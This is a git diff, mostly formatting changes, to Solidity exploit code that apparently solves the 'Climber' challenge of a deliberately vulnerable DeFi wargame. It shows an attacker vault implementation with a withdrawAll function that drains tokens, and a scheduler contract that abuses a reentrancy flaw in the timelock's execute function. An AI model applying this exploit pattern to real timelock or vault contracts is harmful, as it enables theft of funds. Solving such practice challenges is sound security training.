@@ -8,18 +8,17 @@ import {ClimberVault} from "@main/climber/ClimberVault.sol";
 import {ClimberTimelock} from "@main/climber/ClimberTimelock.sol";
 
 contract ClimberAttackerVaultImp is ClimberVault {
-
     // constructor() initializer {}
 
     function withdrawAll(address token) external onlyOwner {
         IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
     }
-
 }
 
 contract ClimberScheduler {
-
-    function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt) external {
+    function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt)
+        external
+    {
         // Recreate the scheduled operation from the attacker contract and call the vault
         // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
         // This is leveraging the existing re-entrancy exploit in `execute`
@@ -47,9 +46,10 @@ contract ClimberScheduler {
         // schedule the proposal
         targets[3] = address(this);
         values[3] = 0;
-        data[3] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",attacker, vaultAddress, vaultTimelockAddress, salt);
+        data[3] = abi.encodeWithSignature(
+            "scheduleOperation(address,address,address,bytes32)", attacker, vaultAddress, vaultTimelockAddress, salt
+        );
 
         vaultTimelock.schedule(targets, values, data, salt);
     }
-
 }
